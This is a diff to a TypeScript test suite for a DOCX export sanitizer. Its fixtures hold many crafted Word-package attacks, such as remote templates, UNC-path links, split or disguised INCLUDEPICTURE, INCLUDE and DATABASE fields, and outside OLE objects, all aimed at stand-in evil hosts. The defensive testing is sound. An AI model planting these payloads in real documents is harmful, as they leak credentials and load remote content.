@@ -504,18 +504,19 @@ describe('Word links and images through both layers (Ruling 335)', () => {
   });
 });
 
+const realGate = async (bytes: Uint8Array) => (await vi.importActual<typeof import('./docxGate')>('./docxGate')).gateDocx(bytes);
+
+/** A built file's parts, before the output gate. */
+async function built(text: string) {
+  vi.mocked(gateDocx).mockImplementationOnce(async (bytes) => bytes);
+  return unzipSync(await buildDocx(doc(text)));
+}
+
+function edit(files: Record<string, Uint8Array>, name: string, change: (xml: string) => string) {
+  files[name] = strToU8(change(strFromU8(files[name]!)));
+}
+
 describe('the output gate (Ruling 335)', () => {
-  const realGate = async (bytes: Uint8Array) => (await vi.importActual<typeof import('./docxGate')>('./docxGate')).gateDocx(bytes);
-
-  async function built(text: string) {
-    vi.mocked(gateDocx).mockImplementationOnce(async (bytes) => bytes);
-    return unzipSync(await buildDocx(doc(text)));
-  }
-
-  function edit(files: Record<string, Uint8Array>, name: string, change: (xml: string) => string) {
-    files[name] = strToU8(change(strFromU8(files[name]!)));
-  }
-
   it('removes an unsafe hyperlink put straight into a built file, and keeps its text', async () => {
     const files = await built('[safe](https://ok.example/) and [web](https://web.example/)\n');
     edit(files, 'word/_rels/document.xml.rels', (xml) => xml.replace('https://ok.example/', '\\\\evil-inj\\share'));
@@ -577,6 +578,187 @@ describe('the output gate (Ruling 335)', () => {
     vi.mocked(gateDocx).mockRejectedValueOnce(new Error(OUTSIDE_CONTENT));
     await expect(exportDocx(doc('Text.\n'))).rejects.toThrow(OUTSIDE_CONTENT);
     expect(writeBinaryFile).not.toHaveBeenCalled();
+  });
+});
+
+const R_NS = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
+const PKG_NS = 'http://schemas.openxmlformats.org/package/2006/relationships';
+const W_NS = 'http://schemas.openxmlformats.org/wordprocessingml/2006/main';
+const DOCUMENT_RELS = 'word/_rels/document.xml.rels';
+
+function wellFormed(xml: string): boolean {
+  return new DOMParser().parseFromString(xml, 'application/xml').getElementsByTagName('parsererror').length === 0;
+}
+
+/** Each relationship reference (r:id, r:embed and so on) in a part that names no relationship. */
+function danglingRefs(files: Map<string, string>): string[] {
+  const dangling: string[] = [];
+  for (const [name, rels] of files) {
+    const match = /^(.*)_rels\/(.+)\.rels$/i.exec(name);
+    const part = match && files.get(`${match[1]}${match[2]}`);
+    if (!part) continue;
+    const ids = new Set([...rels.matchAll(/\sId="([^"]*)"/g)].map(([, id]) => id));
+    for (const [ref, id] of part.matchAll(/\sr:\w+="([^"]*)"/g)) if (!ids.has(id!)) dangling.push(`${name}: ${ref.trim()}`);
+  }
+  return dangling;
+}
+
+describe('the output gate, round 4 (Ruling 339)', () => {
+  it('writes each part it changes with one XML declaration, even where the browser adds its own', async () => {
+    // WebKit and Chromium include the declaration; jsdom does not.
+    const native = XMLSerializer.prototype.serializeToString;
+    const spy = vi.spyOn(XMLSerializer.prototype, 'serializeToString').mockImplementation(function (this: XMLSerializer, node: Node) {
+      return `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>${native.call(this, node)}`;
+    });
+    try {
+      const files = await built('[safe](https://ok.example/) and [web](https://web.example/)\n');
+      edit(files, DOCUMENT_RELS, (xml) => xml.replace('https://ok.example/', '//evil-decl/x'));
+      const out = unzipSync(await realGate(zipSync(files)));
+
+      const rewritten = Object.keys(out).filter((name) => strFromU8(out[name]!) !== strFromU8(files[name]!));
+      expect(rewritten.sort()).toEqual([DOCUMENT_RELS, 'word/document.xml']);
+      for (const name of rewritten) {
+        const xml = strFromU8(out[name]!);
+        expect(wellFormed(xml), name).toBe(true);
+        expect(count(xml, /<\?xml/g), name).toBe(1);
+      }
+    } finally {
+      spy.mockRestore();
+    }
+  });
+
+  it.each([
+    ['a linked image', `[![i](data:image/png;base64,${PNG_BASE64})](https://img.example/)\n`],
+    ['a raw linked image', `<p><a href="https://img.example/"><img src="data:image/png;base64,${PNG_BASE64}" alt="i"></a></p>\n`],
+  ])('leaves nothing pointing at a hyperlink it removes, for %s', async (_name, text) => {
+    const files = await built(text);
+    expect(strFromU8(files['word/document.xml']!)).toMatch(/<a:hlinkClick /);
+    edit(files, DOCUMENT_RELS, (xml) => xml.replace('https://img.example/', '//evil-img/x'));
+    const out = unzip(await realGate(zipSync(files)));
+
+    expect(out.get(DOCUMENT_RELS)).not.toMatch(/evil/);
+    expect(danglingRefs(out)).toEqual([]);
+    expect(out.get('word/document.xml')).not.toMatch(/<a:hlinkClick /);
+    expect(count(out.get('word/document.xml')!, /<w:drawing>/g)).toBe(1);
+  });
+
+  // The verifier's hand-made packages (round 3), each made from a built file.
+  type Files = Record<string, Uint8Array>;
+  const get = (f: Files, n: string) => strFromU8(f[n]!);
+  const set = (f: Files, n: string, s: string) => void (f[n] = strToU8(s));
+  const addRel = (f: Files, n: string, entry: string) => {
+    f[n] ??= strToU8(`<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="${PKG_NS}"></Relationships>`);
+    set(f, n, get(f, n).replace(/<Relationships([^>]*?)\/>/, '<Relationships$1></Relationships>').replace('</Relationships>', `${entry}</Relationships>`));
+  };
+  const rel = (id: string, type: string, target: string, mode = ' TargetMode="External"') =>
+    `<Relationship Id="${id}" Type="${R_NS}/${type}" Target="${target}"${mode}/>`;
+  const body = (f: Files, xml: string, part = 'word/document.xml') => set(f, part, get(f, part).replace(/<w:body>/, `<w:body>${xml}`));
+  const fieldRuns = (...pieces: string[]) =>
+    `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r>${pieces.map((p) => `<w:r><w:instrText xml:space="preserve">${p}</w:instrText></w:r>`).join('')}<w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>r</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`;
+  const field = (instruction: string) => (f: Files) => body(f, fieldRuns(instruction));
+  const retarget = (from: string, to: string, n = DOCUMENT_RELS) => (f: Files) => set(f, n, get(f, n).replace(from, to));
+  const okTo = (target: string, mode: string) => (f: Files) =>
+    set(f, DOCUMENT_RELS, get(f, DOCUMENT_RELS).replace(/Target="https:\/\/ok\.example\/" TargetMode="External"/, `Target="${target}"${mode}`));
+  const minPart = (inner: string, root = 'w:document') =>
+    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?><${root} xmlns:w="${W_NS}" xmlns:r="${R_NS}"><w:body>${inner}</w:body></${root}>`;
+  const internalImage = (target: string) => (f: Files) => {
+    set(f, 'word/document.xml', get(f, 'word/document.xml').replace(/r:embed="(rId[^"]*)"/, 'r:embed="rIdX"'));
+    addRel(f, DOCUMENT_RELS, rel('rIdX', 'image', target, ''));
+  };
+
+  const passed: [string, (f: Files) => void][] = [
+    ['A00 nothing to do', () => {}],
+    ['A01 an Internal hyperlink to a network path', okTo('//evil-a01/x', '')],
+    ['A02 TargetMode with a trailing space', okTo('//evil-a02/x', ' TargetMode="External "')],
+    ['A03 TargetMode with a leading space', okTo('//evil-a03/x', ' TargetMode=" External"')],
+    ['A04 TargetMode in capitals', okTo('//evil-a04/x', ' TargetMode="EXTERNAL"')],
+    ['TargetMode in mixed case with spaces', okTo('//evil-tm/x', ' TargetMode="\texTeRnal "')],
+    ['A05 rels with another prefix', (f) => set(f, DOCUMENT_RELS, get(f, DOCUMENT_RELS).replace('https://ok.example/', '//evil-a05/x').replace(/<(\/?)Relationship/g, '<$1pr:Relationship').replace(`xmlns="${PKG_NS}"`, `xmlns:pr="${PKG_NS}"`))],
+    ['A06 an entity in the target', retarget('https://ok.example/', '&#x2F;&#x2F;evil-a06/x')],
+    ['A07 rels with a byte order mark', (f) => set(f, DOCUMENT_RELS, '\ufeff' + get(f, DOCUMENT_RELS).replace('https://ok.example/', '//evil-a07/x'))],
+    ['A09 .RELS in capitals', (f) => { f['word/_rels/document.xml.RELS'] = strToU8(get(f, DOCUMENT_RELS).replace('https://ok.example/', '//evil-a09/x')); delete f[DOCUMENT_RELS]; }],
+    ['A11 a glossary hyperlink', (f) => { set(f, 'word/glossary/document.xml', minPart('<w:p><w:hyperlink r:id="rIdG"><w:r><w:t>gl</w:t></w:r></w:hyperlink></w:p>', 'w:glossaryDocument')); addRel(f, 'word/glossary/_rels/document.xml.rels', rel('rIdG', 'hyperlink', '//evil-a11/x')); }],
+    ['A12 a footer hyperlink', (f) => { set(f, 'word/footer1.xml', `<?xml version="1.0"?><w:ftr xmlns:w="${W_NS}" xmlns:r="${R_NS}"><w:p><w:hyperlink r:id="rIdF"><w:r><w:t>ft</w:t></w:r></w:hyperlink></w:p></w:ftr>`); addRel(f, 'word/_rels/footer1.xml.rels', rel('rIdF', 'hyperlink', '\\\\evil-a12\\x')); }],
+    ['A13 a comments hyperlink', (f) => { set(f, 'word/comments.xml', `<?xml version="1.0"?><w:comments xmlns:w="${W_NS}" xmlns:r="${R_NS}"><w:comment w:id="0"><w:p><w:hyperlink r:id="rIdC"><w:r><w:t>cm</w:t></w:r></w:hyperlink></w:p></w:comment></w:comments>`); addRel(f, 'word/_rels/comments.xml.rels', rel('rIdC', 'hyperlink', 'file://evil-a13/x')); }],
+    ['A14 an endnotes hyperlink', (f) => { addRel(f, 'word/_rels/endnotes.xml.rels', rel('rIdE', 'hyperlink', '//evil-a14/x')); set(f, 'word/endnotes.xml', get(f, 'word/endnotes.xml').replace(/(<w:endnote [^>]*>)/, '$1<w:p><w:hyperlink r:id="rIdE"><w:r><w:t>en</w:t></w:r></w:hyperlink></w:p>')); }],
+    ['A29 a HYPERLINK to a bookmark', field(' HYPERLINK \\l "bm" ')],
+    ['HYPERLINK with every switch to a web address', field(' HYPERLINK \\l "bm" \\m \\n \\o "tip" \\t "_blank" "https://ok.example/" ')],
+    ['hyperlink in lower case to a web address', field(' hyperlink "https://ok.example/" ')],
+    ['HYPERLINK in curly quotes to a web address', field(' HYPERLINK \u201chttps://ok.example/a b\u201d ')],
+    ['A44 a linked image to a network path', retarget('https://img.example/', '//evil-a44/x')],
+    ['A45 a hlinkClick on its own', (f) => { set(f, 'word/document.xml', get(f, 'word/document.xml').replace(/(<wp:docPr[^>]*?)(\/>|>)/, '$1><a:hlinkClick xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" r:id="rIdH"/>')); addRel(f, DOCUMENT_RELS, rel('rIdH', 'hyperlink', '//evil-a45/x')); }],
+    ['A46 a duplicate relationship id', (f) => addRel(f, DOCUMENT_RELS, rel('rIdDup', 'hyperlink', '//evil-a46/x') + rel('rIdDup', 'hyperlink', 'https://fine.example/'))],
+    ['A47 rels with no namespace', (f) => set(f, DOCUMENT_RELS, get(f, DOCUMENT_RELS).replace(`xmlns="${PKG_NS}"`, '').replace('https://ok.example/', '//evil-a47/x'))],
+    ['A48 a footnote link to a network path', retarget('https://fn.example/', '//evil-a48/x', 'word/_rels/footnotes.xml.rels')],
+    ['A49 a package hyperlink', (f) => addRel(f, '_rels/.rels', rel('rIdP', 'hyperlink', '//evil-a49/x'))],
+    ['A51 a content type only', (f) => set(f, '[Content_Types].xml', get(f, '[Content_Types].xml').replace('</Types>', '<Override PartName="/word/links.xml" ContentType="application/vnd.openxmlformats-package.relationships+xml"/></Types>'))],
+    ['A52 _RELS in capitals', (f) => { set(f, 'word/footer2.xml', `<?xml version="1.0"?><w:ftr xmlns:w="${W_NS}" xmlns:r="${R_NS}"><w:p><w:hyperlink r:id="rIdF"><w:r><w:t>ft</w:t></w:r></w:hyperlink></w:p></w:ftr>`); addRel(f, 'word/_RELS/footer2.xml.rels', rel('rIdF', 'hyperlink', '//evil-a52/x')); }],
+  ];
+
+  const stopped: [string, (f: Files) => void][] = [
+    ['A10 an outside image in customXml', (f) => { set(f, 'customXml/item1.xml', '<?xml version="1.0"?><root/>'); addRel(f, 'customXml/_rels/item1.xml.rels', rel('rId1', 'image', 'https://evil-a10/x.png')); }],
+    ['A15 an outside chart object', (f) => { set(f, 'word/charts/chart1.xml', '<?xml version="1.0"?><c:chartSpace xmlns:c="http://schemas.openxmlformats.org/drawingml/2006/chart"/>'); addRel(f, 'word/charts/_rels/chart1.xml.rels', rel('rId1', 'oleObject', 'file:///\\\\evil-a15\\x.xlsx')); }],
+    ['A16 an altChunk of HTML inside the file', (f) => { body(f, '<w:altChunk r:id="rIdAC"/>'); addRel(f, DOCUMENT_RELS, rel('rIdAC', 'aFChunk', 'afchunk.htm', '')); set(f, 'word/afchunk.htm', '<html><body><img src="http://evil-a16/x.png"></body></html>'); }],
+    ['A17 an outside altChunk', (f) => { body(f, '<w:altChunk r:id="rIdAC"/>'); addRel(f, DOCUMENT_RELS, rel('rIdAC', 'aFChunk', 'http://evil-a17/x.htm')); }],
+    ['A18 an outside OLE object', (f) => addRel(f, DOCUMENT_RELS, rel('rIdO', 'oleObject', '\\\\evil-a18\\x.xls'))],
+    ['A19 an outside template', (f) => addRel(f, 'word/_rels/settings.xml.rels', rel('rIdT', 'attachedTemplate', 'http://evil-a19/t.dotm'))],
+    ['A20 an Internal template with a URL', (f) => { set(f, 'word/settings.xml', get(f, 'word/settings.xml').replace(/(<w:settings[^>]*>)/, '$1<w:attachedTemplate r:id="rIdT"/>')); addRel(f, 'word/_rels/settings.xml.rels', rel('rIdT', 'attachedTemplate', 'http://evil-a20/t.dotm', '')); }],
+    ['an outside image beside the file, TargetMode in capitals', (f) => addRel(f, DOCUMENT_RELS, rel('rIdM', 'image', 'evil-up.png', ' TargetMode="EXTERNAL"'))],
+    ['an outside image beside the file, TargetMode with spaces', (f) => addRel(f, DOCUMENT_RELS, rel('rIdM', 'image', 'evil-sp.png', ' TargetMode=" External "'))],
+    ['an Internal image on a UNC path', internalImage('\\\\evil-iu\\x.png')],
+    ['an Internal image on a network path', internalImage('//evil-in/x.png')],
+    ['an Internal image at an absolute path', internalImage('/evil-abs/x.png')],
+    ['an Internal image on a drive', internalImage('C:\\evil-c\\x.png')],
+    ['A21 an outside frame', (f) => { set(f, 'word/webSettings.xml', `<?xml version="1.0"?><w:webSettings xmlns:w="${W_NS}" xmlns:r="${R_NS}"><w:frameset><w:frame><w:sourceFileName r:id="rIdW"/></w:frame></w:frameset></w:webSettings>`); addRel(f, 'word/_rels/webSettings.xml.rels', rel('rIdW', 'frame', 'http://evil-a21/f.htm')); }],
+    ['A22 a field split over runs', (f) => body(f, fieldRuns('INCLUDEPIC', 'TURE "http://evil-a22/x.png"'))],
+    ['A23 a field split over paragraphs', (f) => body(f, fieldRuns(' INCLUDE') + fieldRuns('PICTURE "http://evil-a23/x.png" '))],
+    ['A24 a field in lower case', field(' includepicture "http://evil-a24/x.png" \\d ')],
+    ['A25 a field in mixed case', field(' IncludeText "\\\\\\\\evil-a25\\\\x.docx" ')],
+    ['A26 hyperlink in lower case', field(' hyperlink "\\\\\\\\evil-a26\\\\x" ')],
+    ['A27 HYPERLINK with no space', field(' HYPERLINK"\\\\\\\\evil-a27\\\\x" ')],
+    ['A28 HYPERLINK with a switch first', field(' HYPERLINK \\o "tip" "\\\\\\\\evil-a28\\\\x" ')],
+    ['HYPERLINK with \\l and \\t first', field(' HYPERLINK \\l "bm" \\t "_blank" "//evil-lt/x" ')],
+    ['HYPERLINK with \\m and \\n first, no spaces', field(' HYPERLINK\\m\\n"//evil-mn/x" ')],
+    ['A30 HYPERLINK in curly quotes', field(' HYPERLINK \u201c\\\\\\\\evil-a30\\\\x\u201d ')],
+    ['HYPERLINK in low and high curly quotes', field(' HYPERLINK \u201e//evil-lq/x\u201c ')],
+    ['HYPERLINK with a bare address', field(' HYPERLINK //evil-bare/x ')],
+    ['A31 a comment inside the instruction', (f) => body(f, '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>INCLUDE<!-- c -->PICTURE "http://evil-a31/x.png"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')],
+    ['A32 CDATA inside the instruction', (f) => body(f, '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText><![CDATA[INCLUDEPICTURE "http://evil-a32/x.png"]]></w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')],
+    ['A33 an instruction with another prefix', (f) => body(f, `<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><q:instrText xmlns:q="${W_NS}">INCLUDEPICTURE "http://evil-a33/x.png"</q:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>`)],
+    ['an instruction in another namespace', (f) => body(f, '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><q:instrText xmlns:q="http://purl.oclc.org/ooxml/wordprocessingml/main">INCLUDEPICTURE "http://evil-ns/x.png"</q:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')],
+    ['a HYPERLINK built from a field inside it', (f) => body(f, '<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> HYPERLINK "</w:instrText></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText> REF evil </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:instrText>" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>')],
+    ['A34 an unknown field (MERGEFIELD)', field(' MERGEFIELD Name ')],
+    ['A35 DATABASE', field(' DATABASE \\d "\\\\\\\\evil-a35\\\\db.mdb" \\s "select * from t" ')],
+    ['A36 RD', field(' RD "\\\\\\\\evil-a36\\\\x.docx" ')],
+    ['A37 INCLUDE', field(' INCLUDE "\\\\\\\\evil-a37\\\\x.docx" ')],
+    ['an unknown field', field(' NEWLOADER "//evil-new/x" ')],
+    ['A38 fldSimple in lower case', (f) => body(f, '<w:p><w:fldSimple w:instr=" includepicture &quot;http://evil-a38/x.png&quot; "><w:r><w:t>s</w:t></w:r></w:fldSimple></w:p>')],
+    ['A39 fldSimple in capitals', (f) => body(f, '<w:p><w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://evil-a39/x.png&quot; "><w:r><w:t>s</w:t></w:r></w:fldSimple></w:p>')],
+    ['A40 VML o:href', (f) => body(f, '<w:p><w:r><w:pict><v:shape xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office" style="width:10pt;height:10pt"><v:imagedata r:id="rId7" o:href="http://evil-a40/x.png"/></v:shape></w:pict></w:r></w:p>')],
+    ['A41 VML r:href to an outside image', (f) => { body(f, '<w:p><w:r><w:pict><v:shape xmlns:v="urn:schemas-microsoft-com:vml"><v:imagedata r:href="rIdV"/></v:shape></w:pict></w:r></w:p>'); addRel(f, DOCUMENT_RELS, rel('rIdV', 'image', 'http://evil-a41/x.png')); }],
+    ['A42 VML v:shape href', (f) => body(f, '<w:p><w:r><w:pict><v:shape xmlns:v="urn:schemas-microsoft-com:vml" href="http://evil-a42/" style="width:10pt;height:10pt"/></w:pict></w:r></w:p>')],
+    ['A43 a linked picture', (f) => { set(f, 'word/document.xml', get(f, 'word/document.xml').replace(/r:embed="(rId[^"]*)"/, 'r:embed="$1" r:link="rIdL"')); addRel(f, DOCUMENT_RELS, rel('rIdL', 'image', 'http://evil-a43/x.png')); }],
+    ['A50 an outside thumbnail', (f) => addRel(f, '_rels/.rels', rel('rIdP', 'metadata/thumbnail', 'http://evil-a50/t.png'))],
+  ];
+
+  async function attacked(attack: (f: Files) => void) {
+    const files = await built(`[safe](https://ok.example/) and [![i](data:image/png;base64,${PNG_BASE64})](https://img.example/) note[^1].\n\n[^1]: See [fn](https://fn.example/).\n`);
+    attack(files);
+    return zipSync(files);
+  }
+
+  it.each(passed)('passes %s with no outside link and nothing broken', async (_name, attack) => {
+    const out = unzip(await realGate(await attacked(attack)));
+    for (const [name, text] of out) {
+      if (!/\.(xml|rels)$/i.test(name)) continue;
+      expect(text, name).not.toMatch(/evil/);
+      expect(wellFormed(text), name).toBe(true);
+    }
+    expect(danglingRefs(out)).toEqual([]);
+  });
+
+  it.each(stopped)('stops the export for %s', async (_name, attack) => {
+    await expect(realGate(await attacked(attack))).rejects.toThrow(OUTSIDE_CONTENT);
   });
 });
 
